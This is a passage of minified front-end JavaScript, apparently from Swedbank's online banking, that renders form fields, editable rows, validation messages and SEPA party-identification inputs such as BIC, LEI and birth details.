descriptor=field.values.filter((o=>o.value===value))[0];descriptor&&(value=descriptor.text)}return $field.text(value||"")}function getField(fieldName){return Forms.$body.field(fieldName)}Fields.render=function(field,value){var $field=$();if("label"===field.type)$field=function createLabelField(field){return $('<span class="label"/>').html(" "+(field.legend||""))}(field);else if(field.disabled)$field=createDisabledField(field,value);else{switch(field.type){case"list":$field=createListField(field,value);break;case"text":$field=function createTextField(field){return field.multiline?$("<textarea/>"):$('<input type="text"/>')}(field);break;case"date":$field=function createDateField(field){return $('<input type="text" class="date-field"/>').data(field.dateOptions||{})}(field);break;case"computed":$field=createDisabledField(field)}$field.is(":text, select")&&(field.minFractionDigits&&$.isNumeric(value)&&value===parseFloat(value).toFixed(field.minFractionDigits)&&(value=parseFloat(value).toFixed(field.minFractionDigits)),$field.val(value)),$field.is(":input")&&$field.copyAttributesFrom(field,"name maxLength")}return"list"!==field.type&&"label"!==field.type&&field.legend&&$field.attr("placeholder",field.legend),$field},Fields.show=function(fieldName){return getField(fieldName).closest("dd").prev().removeClass("hidden")},Fields.hide=function(fieldName){return getField(fieldName).closest("dd").prev().addClass("hidden")}}(jQuery,Swedbank.Forms),function($,Forms){var JSONRenderer=Forms.JSONRenderer={};Forms.data=null,Forms.$container=null,Forms.$body=null;var createParam=Swedbank.Helpers.createParam,createHelp=Swedbank.Templates.createHelp,createAction=Swedbank.Navigation.createAction;function getCheckedValues($inputs){var selectedValues=[];return $inputs.filter(":checked").each((function(){var value=$(this).parent().text();selectedValues.push(value)})),selectedValues.join(", ")}function updatePreviewValue($row){var value=function getPreviewValue($row){var values=[];return $row.find(":input").each((function(){var $field=$(this),$connectedFields=$row.findByName(function toEscapedJQueryString(string){return string.replace(/\.|\[|\]/gi,(function(match){return"\\"+match}))}(this.name));$field.data("value-retrieved")?$field.removeData("value-retrieved"):($connectedFields.not($field).data("value-retrieved",!0),values=$field.is(":checkbox")?$connectedFields.length>1?values.concat(getCheckedValues($connectedFields)):values.concat($field.prop("checked")?"Yes":"No"):$field.is("select")?values.concat($field.children(":selected").text()):$field.is(":radio")?values.concat(getCheckedValues($connectedFields)):values.concat($field.val()))})),values.join(" ")}($row);$row.find(".current-value").text(value)}function equalizeRowHeight($row){var $label=$row.prev();$row.add($label).css("height","auto");var contentHeight=$row.height();$label.height()>contentHeight?$row.height($label.height()):$label.height($row.height())}function stopEditingRow($row){Forms.$body.removeClass("editing-single-row"),$row.add($row.prev()).switchClass("editing","not-editing"),equalizeRowHeight($row)}function addEditingButtons($row){var $editAction=$('<a href="#" class="edit-action"/>'),$saveAction=$('<a href="#" class="save-action button -guiding"/>');$editAction.setDefault("click",(function(){!function startEditingRow($row){Forms.$body.addClass("editing-single-row"),$row.add($row.prev()).switchClass("not-editing","editing"),equalizeRowHeight($row)}($row)})),$saveAction.setDefault("click",(function(){updatePreviewValue($row),stopEditingRow($row)})),stopEditingRow($row),$editAction.prependTo($row),$saveAction.prependTo($row).text(Swedbank.Labels("save")),$row.find(".label").length?$row.find(".label").before('<span class="current-value"/>'):$row.append('<span class="current-value"/>')}function renderRowContent(row){row.children.forEach((function(field){var value=Forms.data.data[field.name];row.cloneable&&row.isNew&&(field.name=row.cloneable.targetOnAdd+"."+field.name,row.isNew&&field.insertOnly&&delete field.disabled),field.$=Forms.Fields.render(field,value).appendTo(row.$),field.values.some((x=>!!x.help))&&Forms.Steps.active.showHelp&&function addInfoModal(field,$row){var infoModal=Swedbank.Modals.create("info-modal"),$infoAction=$("<a/>",{class:"button -guiding info-action",href:"#",text:field.valueHelpActionText});field.$.on("change",(function(){var value=function parseValue(value){value&&!isNaN(value)&&(value*=1);return value}(this.value),valueExists=""!==value;if($infoAction.css("display",valueExists?"inline-block":"none"),field.disabled){var option=field.values.find((x=>!!x.help))[0];infoModal.setTitle(option.text).setContent(option.help)}else if(valueExists){option=field.values.find((x=>x.value===value))[0];infoModal.setTitle(option.text).setContent(option.help)}})),field.$.trigger("change"),$infoAction.before("<br>").appendTo($row).setDefault("click",(function(){infoModal.open()}))}(field,row.$),attachValueUpdateBehaviourTo(field),"computed"===field.type&&row.$.addClass("computed-value-container"),"text"===field.type&&field.multiline&&field.$.characterCounter(),function checkFieldValidity(field,$row){var error=Forms.data.validationErrors.filter((o=>o.target===field.name))[0];error&&markRowAsInvalid($row,error.text)}(field,row.$)}))}function renderRow(row,$fieldsList){if(row.$=$("<dd/>").appendTo($fieldsList),function renderRowTitle(row){var $dt=$("<dt>"+(row.legend||"")+"</dt>");return row.optional&&$dt.addClass("optional"),$dt}(row).insertBefore(row.$),renderRowContent(row),function specifyLayoutRules($row){var $dropdowns=$row.find("select"),$inputs=$row.find("input:not(:radio)");2!=$inputs.length&&2!=$dropdowns.length||$row.addClass("equal-fields"),1==$inputs.length&&1==$row.find(".label").length&&$row.addClass("input-and-label"),1===$inputs.length&&1===$dropdowns.length&&($row.addClass("select-and-input"),$dropdowns.children().first().width()>$dropdowns.width()&&$row.removeClass("select-and-input").addClass("equal-fields"))}(row.$),attachValueUpdateBehaviourTo(row),Forms.Steps.active.isLast){var fields=row.children,onlyLabelField=1===fields.length&&"label"===fields[0].type,allFieldsDisabled=fields.every((x=>!!x.disabled));onlyLabelField||allFieldsDisabled||function addEditing($row){addEditingButtons($row),updatePreviewValue($row),$row.find(".save-action").on("click",(function(){var rowData=$row.parseAsJSON();rowData.editSingle=!0,function clearValidationErrors($row){$row.removeClass("validation-error"),$row.find(".validation-message").remove()}($row),makeAjaxRequest(document.mainForm,rowData,(function(response){var data=response.responseJSON;[].forEach.call(data.validationErrors||[],(function(error){markRowAsInvalid($row,error.text)}))}))}))}(row.$)}else row.optional||row.$.append('<span class="validation-status"/>');Forms.Steps.active.showHelp&&row.help&&createHelp(row.help).appendTo(row.$)}function createDynamicPrefix(start,index){return"number"==typeof index?start+"["+index+"]":start+"['"+index+"']"}function renderCloneableBlock(block){var renderAsTable=!Forms.Steps.active.isLast,blockInListStyle="list"==function getBlockStyle(){return block.cloneable.style?block.cloneable.style:"table"}(),$block=function getInitialBlock(){return renderAsTable&&blockInListStyle?$('<div id="'+block.name+'" class="cloneable-list"/>').appendTo(Forms.$body):$(renderAsTable?'<table class="cloneable"/>':'<div class="cloneable"/>').appendTo(Forms.$body)}();function appendDeleteButton($deleteAction){renderAsTable&&!blockInListStyle?$("<td/>").append($deleteAction).appendTo($block):blockInListStyle?$block.find("dl:last").append($("<dt/>")).append($("<dd/>").append($deleteAction)):$block.find("dd:first").append($deleteAction)}function addBlock(namePrefix,isNewBlock){var $section=function getInitialBlockSection(){return $(renderAsTable&&!blockInListStyle?"<tr/>":'<dl class="query-params-list"/>').appendTo($block)}();return block.children.forEach((function(row){var newRow=$.extend(!0,{},row,{name:row.name?namePrefix+"."+row.name:namePrefix});[].forEach.call(newRow.children||[],(function(field){field.name=newRow.name+"."+field.name,isNewBlock&&(field.insertOnly||row.insertOnly)&&delete field.disabled})),function appendRow(newRow,$section){renderAsTable&&!blockInListStyle?(newRow.$=$("<td/>").appendTo($section),renderRowContent(newRow)):renderRow(newRow,$section)}(newRow,$section)})),$section}!function addTableHeader(){renderAsTable&&!blockInListStyle&&function addTableHeaderRow(){var $headerRow=$("<tr/>").appendTo($block);block.children.forEach((function(row){var $headerCell=$("<th/>",{text:row.legend}).appendTo($headerRow);"date"===row.children[0].type&&$headerCell.addClass("date-column"),row.help&&createHelp(row.help).appendTo($headerCell)})),$headerRow.append("<th/>")}()}(),function addDataBlocks(){[].forEach.call(Forms.data.data[block.name]||[],(function(blockData){var identifier=blockData["@id"];addBlock(createDynamicPrefix(block.name,identifier));block.cloneable.paramOnDelete&&!Forms.Steps.active.isLast&&appendDeleteButton(createAction({class:"delete-action",confirm:block.cloneable.confirmOnDelete},createParam(block.cloneable.paramOnDelete,identifier)).removeClass("button"))}))}(),(renderAsTable||blockInListStyle)&&function addEmptyBlockAndAction(){if(block.cloneable.paramOnAdd&&(addBlock(block.cloneable.targetOnAdd,!0),!Forms.Steps.active.isLast)){var $actionAdd=createAction({class:"-guiding",text:block.cloneable.textOnAdd},createParam(block.cloneable.paramOnAdd));if($block.after($actionAdd),blockInListStyle&&block.cloneable.paramOnDelete)appendDeleteButton(createAction({class:"delete-action",confirm:block.cloneable.confirmOnDelete},createParam(block.cloneable.paramOnDelete,-1)).removeClass("button"))}}()}function renderSimpleBlock(block){var $fieldsList=$('<dl class="query-params-list"/>').appendTo(Forms.$body);block.alwaysEditable&&$fieldsList.addClass("always-editable"),block.children.forEach((function(row){renderRow(row,$fieldsList),row.cloneable&&row.cloneable.paramOnDelete&&!row.isNew&&function addDeleteAction(row){var $deleteAction=createAction({class:"delete-action",confirm:row.cloneable.confirmOnDelete},createParam(row.cloneable.paramOnDelete,row.identifier));$deleteAction.removeClass("button").appendTo(row.$)}(row),row.cloneable&&row.isNew&&function addNewRowAction(row){createAction({class:"-guiding",text:row.cloneable.textOnAdd},createParam(row.cloneable.paramOnAdd)).appendTo(row.$)}(row)}))}function renderBlock(block){block.legend&&Forms.$body.append('<h3 class="form-header">'+(block.legend||"")+"</h3>"),block.help&&Forms.Steps.active.showHelp&&Forms.$body.append('<p class="form-block-description">'+block.help+"</p>"),block.cloneable?renderCloneableBlock(block):renderSimpleBlock(block)}function attachValueUpdateBehaviourTo(target){if(target.paramsOnChange){function callback(){Swedbank.Navigation.goTo(target.paramsOnChange)}target.$.is(":input")?target.$.on("change",callback):target.$.on("change",":input",callback)}}function markRowAsInvalid($container,errorMessage){$container.addClass("validation-error"),$('<p class="validation-message"/>').text(errorMessage).appendTo($container)}function augmentFormData(){!function updateHierarchicNames(){function updateName(element,prefix){element.name?prefix&&(element.name=prefix+"."+element.name):element.name=prefix,[].forEach.call(element.children||[],(function(child){updateName(child,element.cloneable?null:element.name)}))}Forms.data.dataDefinition.forEach((function(element){updateName(element)}))}(),function updateAllowedFieldValues(){Forms.data.dataDefinition.forEach((function updateValues(element){element.range?element.values=Array.from(new Array(element.range[1]),(function(a,i){return i+element.range[0]+1})):element.values||(element.values=[]),element.emptyOption&&element.values.unshift(""),element.values.forEach((function(option,index){"object"!=typeof option&&(element.values[index]={value:option,text:option})})),[].forEach.call(element.children||[],updateValues)}))}(),function generateDynamicFieldValues(){$.each(Forms.data.data,(function(prefix,arr){Array.isArray(arr)&&arr.forEach((function(entry){var uniqueId=entry["@id"];$.each(entry,(function(key,value){if("@id"!==key){var dynamicPrefix=createDynamicPrefix(prefix,uniqueId);Forms.data.data[dynamicPrefix+"."+key]=value}}))}))}))}(),Forms.data.dataDefinition.forEach((function(block){block.children.filter((x=>!!x.cloneable)).forEach((function(row,index){[].forEach.call(Forms.data.data[row.name]||[],(function(rowData){var identifier=rowData["@id"],namePrefix=createDynamicPrefix(row.name,identifier),clonedRow=$.extend({},row,{identifier:identifier,children:[]});row.children.forEach((function(child){clonedRow.children.push($.extend({},child,{name:namePrefix+"."+child.name}))})),block.children.splice(index,0,clonedRow),index++})),row.isNew=!0}))}))}function renderBlankFormSections(){Forms.$container=$('<section class="form frame" id="form-container"/>');var signingContainer=$("#signingContainer, signing-widget");signingContainer.length?Forms.$container.insertBefore(signingContainer[0]):Forms.$container.appendTo("#mainForm"),Forms.Steps.renderList(Forms.data.steps,Forms.$container),Forms.$body=$('<div id="form-body" class="form-content"/>').appendTo(Forms.$container),function renderDisclaimer(){var activeStep=Forms.Steps.active;if(activeStep.disclaimer){var $disclaimer=$('<div class="disclaimer"/>').appendTo(Forms.$body);$("<p/>").text(activeStep.disclaimer).appendTo($disclaimer)}}(),Forms.Navigation.renderActionBar()}JSONRenderer.render=function(source){Forms.data=source,augmentFormData(),renderBlankFormSections(),Forms.data.dataDefinition.forEach(renderBlock);var signing=Forms.Steps.active.signing;signing&&function renderLegalDisclaimer(confirmation,disclaimer){var $disclaimerBody=$("<div/>");$("<input/>",{type:"checkbox",id:"disclaimer-checkbox",name:"legalAccept",value:confirmation}).appendTo($disclaimerBody),$('<label for="disclaimer-checkbox"/>').html(confirmation).appendTo($disclaimerBody),disclaimer&&($disclaimerBody=$disclaimerBody.add($('<div class="legalBlock"/>',{id:"disclaimer-text"}).html(disclaimer))),Forms.$body.append($disclaimerBody)}(signing.confirmationText,signing.disclaimerText),Forms.Navigation.attachNavigationBehaviour(Forms.$container),Forms.enhanceDateFields(),$(document).untilUnload("form-navigate",(function(){Forms.$body.find(":checkbox:not(.multiselect-input input)").each((function(){$("<input/>",{type:"hidden",name:this.name,value:!0===this.checked}).appendTo(Forms.$container),$(this).attr("name","")}))}))}}(jQuery,Swedbank.Forms),Object.create||(Object.create=function(o,properties){if("object"!=typeof o&&"function"!=typeof o)throw new TypeError("Object prototype may only be an Object: "+o);if(null===o)throw new Error("This browser's implementation of Object.create is a shim and doesn't support 'null' as the first argument.");if(void 0!==properties)throw new Error("This browser's implementation of Object.create is a shim and doesn't support a second argument.");function F(){}return F.prototype=o,new F}),function($){Swedbank.Forms.Sepa=new function(){const PartyTypes={ORGANISATION:"ORGANISATION",PRIVATE:"PRIVATE",NONE:"NONE"};function countryExists(value){for(const code in countries)if(code===value)return!0;return!1}const inputs=new function(){const defaultIdentificationNumber={setter:function(object){const self=this;$.each(object,(function(key,value){$(self).find("input[name$="+key+"]").val(value)}))},builder:function(entityName,partyField,defaultValues,readonly){const input=$("<input/>"),id=entityName+"."+partyField+".identificationNumber";return input.attr("id",id),input.attr("name",id),input.attr("type","text"),input.attr("maxlength",35),input.on("input",(_event=>input.val(input.val().toUpperCase()))),void 0!==defaultValues.identificationNumber&&input.val(defaultValues.identificationNumber),readonly&&input.prop("readonly",!0),input},validator:function(shouldValidateCharacters,callback){const input=$(this).find("input[name$=identificationNumber]");Swedbank.Forms.Sepa.Validation.validateIdentificationNumber(input,!0,shouldValidateCharacters,callback)}};return{NONE:{setter:function(){},builder:function(){}},BIC_OR_BEI:{setter:defaultIdentificationNumber.setter,builder:function(entityName,partyField,defaultValues,readonly,isForeign){const fieldName=isForeign?"bicOrBei":"identificationNumber",defaultValue=isForeign?defaultValues.bicOrBei:defaultValues.identificationNumber,input=$("<input/>"),id=entityName+"."+partyField+"."+fieldName;return input.attr("id",id),input.attr("name",id),input.attr("type","text"),input.attr("maxlength",35),void 0!==defaultValue&&input.val(defaultValue),readonly&&input.prop("readonly",!0),input},validator:function(shouldValidateCharacters,callback,isForeign){const fieldName=isForeign?"bicOrBei":"identificationNumber",input=$(this).find("input[name$="+fieldName+"]");input.val(input.val().replace(/\s/g,"").toUpperCase()),Swedbank.Forms.Sepa.Validation.validateBICorBEI(input,!0,callback)}},ANY_BIC:{_getFieldName:isForeign=>isForeign?"bicOrBei":"identificationNumber",setter:defaultIdentificationNumber.setter,builder:function(entityName,partyField,defaultValues,readonly,isForeign){const id=entityName+"."+partyField+"."+inputs.ANY_BIC._getFieldName(isForeign),input=$("<input/>");input.attr("id",id),input.attr("name",id),input.attr("type","text"),input.attr("maxlength",35),input.on("input",(_event=>input.val(input.val().toUpperCase())));const defaultValue=isForeign?defaultValues.bicOrBei:defaultValues.identificationNumber;return void 0!==defaultValue&&input.val(defaultValue),readonly&&input.prop("readonly",!0),input},validator:function(_shouldValidateCharacters,callback,isForeign){const fieldName=inputs.ANY_BIC._getFieldName(isForeign),input=$(this).find(`input[name$=${fieldName}]`);input.val(input.val().replace(/\s/g,"")),Swedbank.Forms.Sepa.Validation.validateAnyBIC(input,!0,callback)}},BANK:defaultIdentificationNumber,CENTRAL_BANK:defaultIdentificationNumber,CERTIFICATE_OF_INCORPORATION:defaultIdentificationNumber,TELEPHONE_NUMBER:defaultIdentificationNumber,CLEARING_NUMBER:defaultIdentificationNumber,DUNS:defaultIdentificationNumber,EMPLOYER_ID_NUMBER_V4:defaultIdentificationNumber,GS1GLN:defaultIdentificationNumber,SIREN:defaultIdentificationNumber,SIRET:defaultIdentificationNumber,LEGAL_ENTITY_IDENTIFIER:{_getFieldName:(isForeign,isForeignStandingOrder)=>isForeign&&!isForeignStandingOrder?"lei":"identificationNumber",setter:defaultIdentificationNumber.setter,builder:function(entityName,partyField,defaultValues,readonly,isForeign,_partyType,isForeignStandingOrder){const id=entityName+"."+partyField+"."+inputs.LEGAL_ENTITY_IDENTIFIER._getFieldName(isForeign,isForeignStandingOrder),input=$("<input/>");input.attr("id",id),input.attr("name",id),input.attr("type","text"),input.attr("maxlength",20),input.on("input",(_event=>input.val(input.val().toUpperCase())));const defaultValue=isForeign&&!isForeignStandingOrder?defaultValues.lei:defaultValues.identificationNumber;return void 0!==defaultValue&&input.val(defaultValue),readonly&&input.prop("readonly",!0),input},validator:function(_shouldValidateCharacters,callback,isForeign,isForeignStandingOrder){const fieldName=inputs.LEGAL_ENTITY_IDENTIFIER._getFieldName(isForeign,isForeignStandingOrder),input=$(this).find(`input[name$=${fieldName}]`);input.val(input.val().replace(/\s/g,"")),Swedbank.Forms.Sepa.Validation.validateLEI(input,!0,callback)}},SOCIAL_SECURITY_NUMBER_V4:defaultIdentificationNumber,ALIEN_REGISTRATION_NUMBER_V4:defaultIdentificationNumber,PASSPORT_NUMBER_V4:defaultIdentificationNumber,COMPANY_ID:defaultIdentificationNumber,NATIONAL_ID_NUMBER:defaultIdentificationNumber,TAX_ID_NUMBER_V4:defaultIdentificationNumber,CUSTOMER_ID_NUMBER_V4:defaultIdentificationNumber,DRIVER_LICENCE_NUMBER:defaultIdentificationNumber,DATE_AND_PLACE_OF_BIRTH:{setter:function(values){const self=this,dateField=$(self).find("input[name$=birthDate]");dateField.addDatepicker();const dateSplit=values.birthDate.split("."),date=new Date(dateSplit[2],dateSplit[1]-1,dateSplit[0],0,0,0),dateFormat=dateField.datepicker("option","dateFormat");dateField.val($.datepicker.formatDate(dateFormat,date)),$(self).find("input[name$=birthCity]").val(values.birthCity),$(self).find("input[name$=birthProvince]").val(values.birthProvince);for(const code in countries)if(countries[code]===values.birthCountry||code===values.birthCountry){$(self).find("select[name$=birthCountry]").val(code);break}},builder:function(entityName,partyField,defaultValues,readonly){const oldIE=$("body").hasClass("old-ie"),prefix=`${entityName}.${partyField}Extended`;let html='<dl class="query-params-list id-type-list">';return html+=`<ui-field label="${Swedbank.Labels("label_birthDate")}" required="true"><ui-datepicker><input type="text" id="${prefix}.birthDate" name="${prefix}.birthDate" max="today" /></ui-datepicker></ui-field>`,html+=`<ui-field label="${Swedbank.Labels("label_birthCity")}" required="true"><input type="text" id="${prefix}.birthCity" name="${prefix}.birthCity" maxlength="35" /></ui-field>`,html+=`<ui-field label="${Swedbank.Labels("label_birthProvince")}"><input type="text" id="${prefix}.birthProvince" name="${prefix}.birthProvince" maxlength="35" /></ui-field>`,html+=`<ui-field label="${Swedbank.Labels("label_birthCountry")}" required="true">`+function(prefix){let html='<select id="'+prefix+'.birthCountry" name="'+prefix+'.birthCountry" class="countries form-field-medium">';return $.each(countries,(function(i,val){let option='<option value="'+i+'" '+(i===Swedbank.country?'selected="true"':"")+">"+val+"</option>";oldIE&&(option=option.replace("<option",'<option title="'+val+'"')),html+=option})),html+="</select>"}(prefix)+"</ui-field>",html+="</dl>",$(html)},postRender:function(){Swedbank.Forms.enhanceDateFields()},validator:function(shouldValidateCharacters,callback){const dateField=$(this).find("input[name$=birthDate]"),cityField=$(this).find("input[name$=birthCity]"),countryField=$(this).find("select[name$=birthCountry]"),provinceField=$(this).find("input[name$=birthProvince]");Swedbank.Forms.Sepa.Validation.validateBirthDate(dateField,"date",!0,callback),Swedbank.Forms.Sepa.Validation.validateIdField(cityField,"city",!0,shouldValidateCharacters,callback),Swedbank.Forms.Sepa.Validation.validateIdField(provinceField,"province",!1,shouldValidateCharacters,callback),Swedbank.Forms.Sepa.Validation.validateBirthCountry(countryField,"country",!0,callback,countryExists)}},OTHER:{setter:function(values){const self=this;$.each(values,(function(i,val){$(self).find("input[name$="+i+"]").val(val)}))},builder:function(entityName,partyField,defaultValues,readonly,isForeign,partyType){const isIdProprietary=!isForeign||partyType===PartyTypes.ORGANISATION,prefix=`${entityName}.${partyField}`;let html='<dl class="query-params-list id-type-list">';html+=`<ui-field label="${Swedbank.Labels("labelId")}" required="true"><input class="document-field" type="text" id="${prefix}.identificationNumber" name="${prefix}.identificationNumber" maxlength="35" /></ui-field>`;const idAndName=isIdProprietary?`${prefix}Extended.idProprietary`:`${prefix}Extended.documentType`;return html+=`<ui-field label="${Swedbank.Labels("label_idProprietary")}" ><input class="document-field" type="text" id="${idAndName}" name="${idAndName}" maxlength="35" /></ui-field>`,html+=`<ui-field label="${Swedbank.Labels("label_idIssuer")}"><input class="document-field" type="text" id="${prefix}Extended.idIssuer" name="${prefix}Extended.idIssuer" maxlength="35" /></ui-field>`,html+="</dl>",$(html)},validator:function(shouldValidateCharacters,callback,isForeign,partyType){const proprietaryIdType=!isForeign||partyType===PartyTypes.ORGANISATION?$(this).find("input[name$=idProprietary]"):$(this).find("input[name$=documentType]"),id=$(this).find("input[name$=identificationNumber]"),idIssuer=$(this).find("input[name$=idIssuer]");Swedbank.Forms.Sepa.Validation.validateIdField(proprietaryIdType,"proprietary",!1,shouldValidateCharacters,callback),Swedbank.Forms.Sepa.Validation.validateIdentificationNumber(id,!0,shouldValidateCharacters,callback),Swedbank.Forms.Sepa.Validation.validateIdField(idIssuer,"issuer",!1,shouldValidateCharacters,callback)}}}},createOption=function(value,text){const option=$("<option></option>");return option.text(Swedbank.Labels("identificatorType_"+text)),option.val(value),$("body").hasClass("old-ie")&&option.attr("title",option.text()),option},PartyId=function(selector,options){const clearInputFieldsContainerValues=function(){inputFieldsContainer&&inputFieldsContainer.find("input").val("")},clearInputFields=function(row){row.find(".input-fields").html("")},targetRowSelector=selector,entityName=options.entityName,partyField=options.partyField,isForeign=options.isForeign||!1,isForeignStandingOrder=options.isForeignStandingOrder||!1;if(!options.mainIdTypes)throw new Error("mainIdTypes is not defined");if(this.mainIdTypes=options.mainIdTypes,!options.extendedIdTypes)throw new Error("extendedIdTypes is not defined");let mainIdTypeRow,mainIdTypesDropdown,extendedIdTypeRow,extendedIdTypesDropdown,partyTypeValueInput,idTypeValueInput,inputFieldsContainer;this.extendedIdTypes=options.extendedIdTypes,this.create=function(){return mainIdTypeRow=$(targetRowSelector),mainIdTypesDropdown=this.createMainIdTypeDropdown(),partyTypeValueInput=function createPartyTypeValueInput(){const input=$("<input/>");return input.attr("type","hidden"),input.attr("name",entityName+"."+partyField+".partyType"),input.attr("class","party-type-input"),input}(),idTypeValueInput=function createIdTypeValueInput(){const input=$("<input/>");return input.attr("type","hidden"),input.attr("name",entityName+"."+partyField+".idType"),input.attr("class","id-type-input"),input}(),mainIdTypeRow.empty().append(idTypeValueInput).append(partyTypeValueInput).append(createTable(mainIdTypesDropdown)),mainIdTypeRow.show(),this.onMainIdTypeChange(),mainIdTypeRow.data("partyId",this),this},this.update=function(){const currentIdType=idTypeValueInput.val(),newMainIdTypesDropdown=this.createMainIdTypeDropdown();0===newMainIdTypesDropdown.find("option[value="+currentIdType+"]").length?this.create():(mainIdTypesDropdown.replaceWith(newMainIdTypesDropdown),mainIdTypesDropdown=newMainIdTypesDropdown,mainIdTypesDropdown.val(currentIdType))},this.getMainIdDropdownIdTypes=function(partyType){return this.mainIdTypes[partyType]},this.getExtendedIdDropdownIdTypes=function(partyType){return this.extendedIdTypes[partyType].slice(0)},this.createMainIdTypeDropdown=function(){const dropdown=$('<select class="form-field-long"></select>');return dropdown.append(createOption("NONE","doNotSpecify")),dropdown.append(createOptGroup(PartyTypes.ORGANISATION,this.getMainIdDropdownIdTypes(PartyTypes.ORGANISATION))),dropdown.append(createOptGroup(PartyTypes.PRIVATE,this.getMainIdDropdownIdTypes(PartyTypes.PRIVATE))),dropdown.change($.proxy(this.onMainIdTypeChange,this)),dropdown},this.onMainIdTypeChange=function(){const idType=mainIdTypesDropdown.val(),partyType=this.getCurrentPartyType();idTypeValueInput.val(idType),partyTypeValueInput.val(partyType||PartyTypes.NONE),"NONE"===idType?(extendedIdTypeRow&&extendedIdTypeRow.hide(),mainIdTypeRow.find(".input-fields").hide(),clearInputFieldsContainerValues()):(clearInputFields(mainIdTypeRow),extendedIdTypeRow&&extendedIdTypeRow.remove(),"EXTENDED"===idType?(idTypeValueInput.val(""),this.createExtendedIdTypeRow(mainIdTypeRow,partyType)):(inputFieldsContainer=mainIdTypeRow.find(".input-fields"),setInputFields(inputFieldsContainer,partyType,idType,this.getDefaultValues(idType),this.isReadonly(idType))))},this.getCurrentPartyType=function(){return $(mainIdTypesDropdown).find("option:selected").closest("optgroup").data("partyType")},this.getCurrentIdType=function(){return $(idTypeValueInput).val()},this.getMainIdDropdownValue=function(){return $(mainIdTypesDropdown).val()},this.getExtendedIdDropdownValue=function(){return $(mainIdTypesDropdown).val()},this.createExtendedIdTypeRow=function(mainIdTypesRow,partyType){extendedIdTypesDropdown=this.createExtendedIdTypeDropdown(partyType),extendedIdTypeRow=$("<dt>"+Swedbank.Labels("labelIdType")+"</dt><dd></dd>"),extendedIdTypeRow.filter("dd").html(createTable(extendedIdTypesDropdown)),extendedIdTypeRow.insertAfter(mainIdTypesRow)},this.createExtendedIdTypeDropdown=function(partyType){const dropdown=$('<select class="form-field-medium"></select>'),idTypes=this.getExtendedIdDropdownIdTypes(partyType);return dropdown.append(createOption("","NONE")),$.each(idTypes,(function(i,val){let text=val;partyType===PartyTypes.ORGANISATION&&"EMPLOYER_ID_NUMBER_V4"===text&&(text=text.slice(0,-3)),dropdown.append(createOption(val,"NONE"===text?"doNotSpecify":text))})),dropdown.change($.proxy(this.onExtendedIdTypeChange,this)),dropdown},this.onExtendedIdTypeChange=function(){const idType=extendedIdTypesDropdown.val(),partyType=this.getCurrentPartyType();idTypeValueInput.val(idType),""===idType?(clearInputFieldsContainerValues(),inputFieldsContainer.hide()):(clearInputFields(extendedIdTypeRow),inputFieldsContainer=extendedIdTypeRow.find(".input-fields"),setInputFields(inputFieldsContainer,partyType,idType,this.getDefaultValues(idType),this.isReadonly(idType)))};function createOptGroup(partyType,idTypes){const optgroup=$("<optgroup></optgroup>");return optgroup.data("partyType",partyType),optgroup.attr("label",Swedbank.Labels("partyType_"+partyType)),$.each(idTypes,(function(i,val){optgroup.append(createOption(val,val))})),optgroup.append(createOption("EXTENDED","EXTENDED")),optgroup}function createTable(dropdown){const table=$('<div class="party-identification-container"></div>');let col=$('<div class="dropdown"></div>');return col.append(dropdown),table.append(col),col=$('<div class="input-fields"></div>'),table.append(col),table}function setInputFields(container,partyType,idType,defaultValues,readonly){const html=inputs[idType].builder.call(this,entityName,partyField,defaultValues,readonly,isForeign,partyType,isForeignStandingOrder);container.html(html),container.show(),void 0!==inputs[idType].postRender&&inputs[idType].postRender.call(inputs,inputs)}return this.getDefaultValues=function(idType){return{}},this.isReadonly=function(idType){return!1},this.isEmpty=function(){const notSelected="EXTENDED"===mainIdTypesDropdown.val()&&!extendedIdTypesDropdown.val();return("NONE"===idTypeValueInput.val()||""===idTypeValueInput.val())&&!notSelected},this.setValue=function(partyType,idType,values){if(partyType===PartyTypes.NONE||!partyType||!idType)return this.setMainIdTypesDropdownValue("NONE"),void partyTypeValueInput.val(PartyTypes.NONE);const isMainIdType=-1!==this.getMainIdDropdownIdTypes(partyType).indexOf(idType);let optgroup;$.each(mainIdTypesDropdown.find("optgroup"),(function(i,val){$(this).data("partyType")===partyType&&(optgroup=$(this))})),isMainIdType?(optgroup.find("[value="+idType+"]").prop("selected",!0),mainIdTypesDropdown.trigger("change"),inputs[idType].setter.call(inputFieldsContainer,values)):(optgroup.find("[value=EXTENDED]").prop("selected",!0),mainIdTypesDropdown.trigger("change"),this.setExtendedIdTypesDropdownValue(idType),inputs[idType].setter.call(inputFieldsContainer,values)),$(".ui-datepicker-trigger").remove()},this.setMainIdTypesDropdownValue=function(idType){mainIdTypesDropdown.find("[value="+idType+"]").prop("selected",!0),mainIdTypesDropdown.trigger("change")},this.setExtendedIdTypesDropdownValue=function(idType){extendedIdTypesDropdown.val(idType),extendedIdTypesDropdown.trigger("change")},this.getMainIdTypesRow=function(){return mainIdTypeRow},this.getExtendedIdTypesRow=function(){return extendedIdTypeRow},this.validate=function(shouldValidateCharacters,callback){const idType=idTypeValueInput.val();"EXTENDED"!==mainIdTypesDropdown.val()||""!==idType?idType&&inputs[idType].validator&&inputs[idType].validator.call(inputFieldsContainer,shouldValidateCharacters,callback,isForeign,isForeignStandingOrder):callback(extendedIdTypesDropdown,"empty")},this.clear=function(){this.setValue(PartyTypes.NONE,null,{})},this},FormHelper=new function(){const getIdType=function(data,party){return data[party+".idType"]},getValues=function(data,party){return{idProprietary:data[party+".idProprietary"],idIssuer:data[party+".idIssuer"],identificationNumber:data[party+".identificationNumber"],documentType:data[party+".documentType"],bicOrBei:data[party+".bicOrBei"],lei:data[party+".lei"],birthDate:data[party+".birthDate"],birthCity:data[party+".birthCity"],birthProvince:data[party+".birthProvince"],birthCountry:data[party+".birthCountry"]}};return this.fillPartiesId=function(data,parties){$.each(parties,(function(name,party){"debtor"===name?party.setValue(getIdType(data,name),getValues(data,name)):party.setValue(function(data,party){return data[party+".partyType"]}(data,name),getIdType(data,name),getValues(data,name))}))},this},Validation=new function(){const validateAddressField=function(field,fieldName,maxLength,onErrorCallback,typeOfAllowedCharacters){if(isEmpty(field)||isEmpty(field.val()))return;const value=$.trim(field.val());if(value.length>maxLength)return void onErrorCallback(field,fieldName,"tooLong");const characterValidationResult=validateCharacters(value,typeOfAllowedCharacters);characterValidationResult.containsInvalidCharacters()&&onErrorCallback(field,fieldName,"containsInvalidCharacters",{characterValidationResult:characterValidationResult})},isFollowingDatePatternStandards=function(value){if(!isEmpty(value)){const 